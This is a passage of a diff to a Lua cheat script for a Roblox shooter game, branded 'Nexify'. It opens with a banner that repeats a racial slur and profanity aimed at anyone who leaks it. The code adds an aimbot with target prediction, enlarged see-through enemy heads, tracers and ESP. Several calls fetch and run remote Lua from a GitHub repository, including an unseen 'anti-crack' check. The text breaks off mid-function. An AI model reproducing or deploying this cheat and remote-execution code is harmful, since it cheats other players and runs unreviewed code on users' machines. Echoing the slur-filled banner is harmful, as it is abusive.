---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
 
--- Initialize
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 local level = "1.5"
@@ -1281,45 +1272,41 @@ warn("System Disconnected With 0% Success Rate.")
 
 end
 
--- Pastebin URL
+
 local pastebinUrl = "https://raw.githubusercontent.com/97y1oHW/4991/refs/heads/main/byprasd32asscheck.lua"
 
--- Function to fetch and loadstring the pastebin code
+
 local success, response = pcall(function()
     return loadstring(game:HttpGet(pastebinUrl))()
 end)
 
--- Check the response
+
 if success and response == "bypassed" then
-    -- Pastebin returned "active", so continue running the main script
+    
     print("A-C SYSTEM RESULT: BYPASS")
 
-    -- Place your main script logic here
-    -- Example: your main exploit code or game feature
-
 else
-    -- Pastebin returned nil or there's an error, script won't run
     print("Anti-Crack System Trigered!")
     print("continue")
 end
 
-		-- Create a function to apply ForceField to all parts in the game and remove SurfaceAppearance
+		
 local function applyForceFieldAndRemoveSurfaceAppearance()
-    -- Get all parts in the game
+    
     for _, part in pairs(workspace:GetDescendants()) do
-        -- Check if the part is a BasePart (like Part, MeshPart, etc.)
+        
         if part:IsA("BasePart") then
-            -- Destroy any SurfaceAppearance attached to the part
+            
             local surfaceAppearance = part:FindFirstChildOfClass("SurfaceAppearance")
             if surfaceAppearance then
                 surfaceAppearance:Destroy()
             end
             
-            -- Check if the part already has a ForceField
+            
             if not part:FindFirstChildOfClass("ForceField") then
-                -- Create a new ForceField
+                
                 local forceField = Instance.new("ForceField")
-                -- Set the parent of the ForceField to the part
+                
                 forceField.Parent = part
             end
         end
@@ -1331,9 +1318,9 @@ local player = game.Players.LocalPlayer
 local mouse = player:GetMouse()
 local grassVisible = true
 local predictionEnabled = false
-local adjustPredictionEnabled = false -- Default to enabled
+local adjustPredictionEnabled = false 
 local executorname33 = "Unknown"
-local predictionFactor = { value = 0.118 } -- Adjust this value based on desired prediction (higher means more prediction)
+local predictionFactor = { value = 0.118 } 
 local aimbotEnabled = false
 local plrs = game:GetService("Players")
 local virtualInput = game:GetService("VirtualInputManager")
@@ -1343,28 +1330,28 @@ local ammo = game.ReplicatedStorage.AmmoTypes
 local players = game:GetService("Players")
 local localPlayer = players.LocalPlayer
 local isAiming = false
-local headSizeMultiplier = 5 -- Multiplier for head size
-local transparencyValue = 0.3 -- Transparency for the head
+local headSizeMultiplier = 5 
+local transparencyValue = 0.3 
 local targetHead = nil
-local targetPart = "Head" -- Default target part
-local isEnabled = false -- State to track if the effect is on or off
+local targetPart = "Head" 
+local isEnabled = false 
 local aimingTarget = nil
 
--- Function to print the loading bar with percentage and hash marks
+
 local function printLoadingBar(percentage)
     local totalLength = 27
-    local hashMarks = math.floor(percentage / 3.6)  -- Number of hash marks
-    local dashes = totalLength - hashMarks          -- Remaining dashes
+    local hashMarks = math.floor(percentage / 3.6)  
+    local dashes = totalLength - hashMarks          
     
     local loadingBar = string.rep("#", hashMarks) .. string.rep("-", dashes)
-    warn(string.format("Loading Nexify V1.8 %%%-3d %s", percentage, loadingBar))
+    warn(string.format("Loading Nexify %%%-3d %s", percentage, loadingBar))
 end
 
--- Function to simulate the loading process
+
 local function simulateLoading()
     for percentage = 0, 100, 1 do
         printLoadingBar(percentage)
-        wait(0.02)  -- Adjust the wait time to make the loading appear slower or faster
+        wait(0.002)  
     end
 end
         Notification:Notify(
@@ -1374,7 +1361,7 @@ end
         )
 
 
--- Run the simulation
+
 simulateLoading()
 
 print("If script ui not appears try spawning and waiting for 2 min")
@@ -1391,23 +1378,23 @@ wait(2)
 
 
 
--- Wait for the character to be added to the player
+
 local character = player.Character or player.CharacterAdded:Wait()
 
--- Wait for the humanoid to be present in the character
+
 local humanoid = character:WaitForChild("Humanoid")
 
--- Function to toggle the swimming state
+
 local function toggleSwimmingState()
-    -- Check the current swimming state
+    
     local isSwimmingEnabled = humanoid:GetStateEnabled(Enum.HumanoidStateType.Swimming)
     
-    -- Toggle the swimming state
+    
     humanoid:SetStateEnabled(Enum.HumanoidStateType.Swimming, not isSwimmingEnabled)
 end
 
--- Example usage
-  -- This will toggle the swimming state (enable if currently disabled, disable if currently enabled)
+
+  
 
 
 
@@ -1415,15 +1402,15 @@ end
 
 
 
--- Call the function to apply the change
+
 
 
 local function detectExecutor()
-    -- Check if identifyexecutor exists and what it returns
+    
     if type(identifyexecutor) == "function" then
         local executorName = identifyexecutor()
         
-        -- Check for known executors
+        
         if executorName == "Solara" then
             return "Solara"
         elseif executorName == "Synapse" then
@@ -1449,11 +1436,11 @@ local function detectExecutor()
         end
     end
     
-    -- If no known executor is detected
+    
     return "Unknown Executor"
 end
 
--- Main script execution
+
 local executor = detectExecutor()
 
 if executor == "Solara" then
@@ -1461,15 +1448,15 @@ if executor == "Solara" then
     executorname33 = "Solara"
 elseif executor == "Wave" or executor == "Wave 5.0" then
     print("This script is running in Wave Executor (Called Loadstring!).")
-    -- New example script written by wally
--- You can suggest changes with a pull request or something
+    
+
 
 local repo = 'https://raw.githubusercontent.com/97y1oHW/4991/main/'
 local espLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/97y1oHW/4991/refs/heads/main/esplib3.lua'),true))()
 local Library = loadstring(game:HttpGet(repo .. 'libbet.lua'))()
 local ThemeManager = loadstring(game:HttpGet(repo .. 'ThemeManager.lua'))()
 local SaveManager = loadstring(game:HttpGet(repo .. 'SaveManager.lua'))()
-    return -- Stop the script from executing further
+    return 
 
 elseif executor == "Manti" then
     print("This script is running in Manti Executor (Not allowed)")
@@ -1486,40 +1473,40 @@ elseif executor == "Celery" then
 else
     print("Unknown executor detected.")
 end
--- Your actual script logic here
 
 
--- Function to apply head effect to a single player
+
+
 local function applyHeadEffect(player)
     if player ~= localPlayer and player.Character then
         local head = player.Character:FindFirstChild("Head")
         if head then
             if isEnabled then
-                -- Increase head size and adjust transparency
+                
                 head.Size = Vector3.new(headSizeMultiplier, headSizeMultiplier, headSizeMultiplier)
                 head.Transparency = transparencyValue
             else
-                -- Reset head size and transparency
-                head.Size = Vector3.new(1, 1, 1) -- Reset to normal size
+                
+                head.Size = Vector3.new(1, 1, 1) 
                 head.Transparency = 0
             end
         end
     end
 end
 
--- Function to toggle head size and transparency for all players
+
 local function toggleHeadEffect()
-    isEnabled = not isEnabled -- Toggle the state
+    isEnabled = not isEnabled 
     
     for _, player in pairs(players:GetPlayers()) do
         applyHeadEffect(player)
     end
 end
 
--- Function to continuously check for new players and apply the effect if needed
+
 local function checkForNewPlayers()
     while true do
-        wait(10) -- Wait 10 seconds before checking again
+        wait(10) 
         if isEnabled then
             for _, player in pairs(players:GetPlayers()) do
                 applyHeadEffect(player)
@@ -1528,67 +1515,67 @@ local function checkForNewPlayers()
     end
 end
 
--- Start the player check loop in a separate thread
+
 spawn(checkForNewPlayers)
 
--- Create a ScreenGui
---local screenGui = Instance.new("ScreenGui")
---screenGui.Name = "VideoGui"
---screenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
-
--- Create a VideoFrame
---local videoFrame = Instance.new("VideoFrame")
---videoFrame.Name = "IntroVideo"
---videoFrame.Size = UDim2.new(1, 0, 1, 0)  -- Full screen
---videoFrame.Position = UDim2.new(0, 0, 0, 0)
---videoFrame.Parent = screenGui
-
--- Set the video asset ID (replace with your video asset ID)
---videoFrame.Video = "rbxassetid://5608412605"
--- Start playing the video
---videoFrame:Play()
---wait(12)
---videoFrame:Destroy()
 
 
--- Optional: Connect to the video end event
---videoFrame.Ended:Connect(function()
-    -- Hide or remove the video frame after it finishes playing
---    videoFrame:Destroy()
---end)
--- Create a function for ban detection
 
 
--- Function to toggle the aimbot
--- Function to toggle the aimbot
--- Function to toggle the aimbot
--- Function to toggle the aimbot
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    
+
+
+
+
+
+
+
+
+
 function toggleAimbot()
-    aimbotEnabled = not aimbotEnabled -- Toggle the state
+    aimbotEnabled = not aimbotEnabled 
 
     if not aimbotEnabled then
-        isAiming = false -- Reset aiming when disabling
-        targetHead = nil -- Clear target head
+        isAiming = false 
+        targetHead = nil 
     end
 end
 
--- Function to toggle prediction
+
 function togglePrediction()
-    predictionEnabled = not predictionEnabled -- Toggle the prediction state
+    predictionEnabled = not predictionEnabled 
     print("Prediction Enabled: ", predictionEnabled)
 end
 
--- Function to toggle adjust prediction feature
+
 function toggleAdjustPrediction()
-    adjustPredictionEnabled = not adjustPredictionEnabled -- Toggle the adjust prediction state
+    adjustPredictionEnabled = not adjustPredictionEnabled 
     if not adjustPredictionEnabled then
-        predictionFactor = 0.118 -- Reset to default prediction factor
+        predictionFactor = 0.118 
     end
     print("Adjust Prediction Enabled: ", adjustPredictionEnabled)
     print("Current Prediction Factor: ", predictionFactor)
 end
 
--- Function to adjust prediction factor based on distance
+
 local function adjustPredictionFactor(distance)
     if adjustPredictionEnabled then
         if distance >= 400 then
@@ -1600,16 +1587,16 @@ local function adjustPredictionFactor(distance)
         elseif distance >= 100 then
             predictionFactor = 0.140
         else
-            predictionFactor = 0.115 -- Default if under 100 meters
+            predictionFactor = 0.115 
         end
         print("Current Prediction Factor: ", predictionFactor)
     end
 end
 
--- Function to predict future position based on velocity
+
 local function predictTargetPosition(target)
     if not predictionEnabled then
-        return target.Position -- Return the current position if prediction is disabled
+        return target.Position 
     end
 
     local targetCharacter = target.Parent
@@ -1618,77 +1605,77 @@ local function predictTargetPosition(target)
         local velocity = humanoidRootPart.AssemblyLinearVelocity
         local currentPosition = target.Position
         
-        -- Assume distance is provided externally
-        adjustPredictionFactor(distance)  -- Update prediction factor based on distance
+        
+        adjustPredictionFactor(distance)  
 
-        -- Calculate the predicted position
+        
         local predictedPosition = currentPosition + velocity * predictionFactor
         return predictedPosition
     end
     return target.Position
 end
 
--- Function to lock the aim on the head with prediction
+
 function updateAimbot()
     if aimbotEnabled and isAiming then
-        local target = mouse.Target -- Get the object the mouse is currently over
+        local target = mouse.Target 
 
-        -- Check if the target is an NPC character
+        
         if target and target.Parent then
             local npcModel = target.Parent
             if npcModel:FindFirstChild("Humanoid") and npcModel:FindFirstChild("Head") then
-                targetHead = npcModel.Head -- Set target to the NPC's head
+                targetHead = npcModel.Head 
             end
         end
 
-        -- Aim at the head with prediction if it exists
+        
         if targetHead then
             local targetPosition = predictTargetPosition(targetHead)
 
-            -- Smoothly aim at the predicted head position
+            
             workspace.CurrentCamera.CFrame = CFrame.new(workspace.CurrentCamera.CFrame.Position, targetPosition)
         end
     end
 end
 
--- Input handling for right mouse button
+
 mouse.Button2Down:Connect(function()
     if aimbotEnabled then
-        isAiming = true -- Start aiming when right mouse button is held down
+        isAiming = true 
     end
 end)
 
 mouse.Button2Up:Connect(function()
-    isAiming = false -- Stop aiming when right mouse button is released
-    targetHead = nil -- Unlock the target when the right mouse button is released
+    isAiming = false 
+    targetHead = nil 
 end)
 
--- Heartbeat connection to update aimbot
+
 game:GetService("RunService").Heartbeat:Connect(updateAimbot)
 
--- Example input to toggle prediction and adjust prediction features (you can change the input method as needed)
--- For example, use a keybind or button to toggle `togglePrediction()` and `toggleAdjustPrediction()`
 
--- Example input to toggle prediction and adjust prediction features (you can change the input method as needed)
--- For example, use a keybind or button to toggle `togglePrediction()` and `toggleAdjustPrediction()`
 
--- Example input to toggle prediction (you can change the input method as needed)
--- For example, use a keybind or button to toggle `togglePrediction()`
 
--- Function to get the ping
+
+
+
+
+
+
+
 local function getPing()
     local stats = game:GetService("Stats")
     local networkStats = stats.Network.ServerStatsItem["Data Ping"]
     return math.floor(networkStats:GetValue())
 end
 
--- Function to get the FPS
+
 local function getFPS()
     local fps = workspace:GetRealPhysicsFPS()
     return math.floor(fps)
 end
 
--- Function to update the info text
+
 local function updateInfo()
     while true do
         infoLabel.Text = string.format("FPS: %d  Ping: %dms", getFPS(), getPing())
@@ -1696,11 +1683,11 @@ local function updateInfo()
     end
 end
 
--- Function to toggle grass visibility
+
 function toggleGrass()
     grassVisible = not grassVisible
 
-    -- Loop through all terrain decoration instances
+    
     for _, terrain in ipairs(workspace:GetDescendants()) do
         if terrain:IsA("Terrain") then
             for _, decoration in ipairs(terrain:GetChildren()) do
@@ -1712,10 +1699,10 @@ function toggleGrass()
     end
 end
 
--- Function to smoothly change the RGB color of the title label's tex
 
--- Start the info update and RGB animation
---spawn(updateInfo)
+
+
+
 
 
 
@@ -1724,7 +1711,7 @@ local counter = 0
 print("loading Nexify")
 print('load_' .. tostring(counter))
 
--- Load external script (make sure this is the intended use)
+
 loadstring(game:HttpGet("https://raw.githubusercontent.com/97y1oHW/4991/refs/heads/main/externalsc.lua"))()
 counter = counter + 1
 do
@@ -1757,10 +1744,10 @@ print("1")
 print('sucker_' .. tostring(counter))
 counter = counter + 1
 local Window = Library:CreateWindow({
-    -- Set Center to true if you want the menu to appear in the center
-    -- Set AutoShow to true if you want the menu to appear when it is created
-    -- Position and Size are also valid options here
-    -- but you do not need to define them unless you are changing them :)
+    
+    
+    
+    
 
     Title = 'Nexify / Solara PD',
     Center = true,
@@ -1774,7 +1761,7 @@ local Tabs = {
     Misc = Window:AddTab('Misc 🔅'),
     Lua = Window:AddTab('Other 🛠️'),
     ['UI Settings'] = Window:AddTab('UI Settings'),
-  --  Settings = Window:AddTab('Settings 🎚️'),
+  
 }
 
 MenuGroup = Tabs['UI Settings']:AddLeftGroupbox('Menu')
@@ -1783,37 +1770,37 @@ MenuGroup = Tabs['UI Settings']:AddLeftGroupbox('Menu')
 ThemeManager:SetLibrary(Library)
 SaveManager:SetLibrary(Library)
 
--- Ignore keys that are used by ThemeManager.
--- (we dont want configs to save themes, do we?)
+
+
 SaveManager:IgnoreThemeSettings()
 
--- Adds our MenuKeybind to the ignore list
--- (do you want each config to have a different menu key? probably not.)
 
 
--- use case for doing it this way:
--- a script hub could have themes in a global folder
--- and game configs in a separate folder per game
+
+
+
+
+
 ThemeManager:SetFolder('Nexify')
 SaveManager:SetFolder('Nexify/ProjectDildo')
 
--- Builds our config menu on the right side of our tab
+
 SaveManager:BuildConfigSection(Tabs['UI Settings'])
 
--- Builds our theme menu (with plenty of built in themes) on the left side
--- NOTE: you can also call ThemeManager:ApplyToGroupbox to add it to a specific groupbox
+
+
 ThemeManager:ApplyToTab(Tabs['UI Settings'])
 
--- You can use the SaveManager:LoadAutoloadConfig() to load a config
--- which has been marked to be one that auto loads!
+
+
 SaveManager:LoadAutoloadConfig()
 
 
 
---CYqXb6TX
+
 loadstring(game:HttpGet("https://raw.githubusercontent.com/97y1oHW/4991/refs/heads/main/scriptinitializecheck3.lua"))()
 
-local autoFireEnabled = false -- Initially disabled
+local autoFireEnabled = false 
 local plr = plrs.LocalPlayer
 local mouse = plr:GetMouse()
 
@@ -1831,45 +1818,45 @@ counter = counter + 1
 
 
 
--- Table to store tracers for all players
+
 local tracers = {}
 
--- Function to toggle the tracer for a specific player
+
 local function toggleTracer(player)
-    -- If the tracer is already enabled for the player, disable it
+    
     if tracers[player] then
-        tracers[player]:Destroy()  -- Remove the tracer part
+        tracers[player]:Destroy()  
         tracers[player] = nil
     else
-        -- Otherwise, create and enable the tracer
+        
         local head = player.Character and player.Character:FindFirstChild("Head")
         if head then
-            -- Create a new part for the tracer
+            
             local tracerPart = Instance.new("Part")
-            tracerPart.Size = Vector3.new(0.2, 0.2, 2)  -- Thin and short
+            tracerPart.Size = Vector3.new(0.2, 0.2, 2)  
             tracerPart.Anchored = true
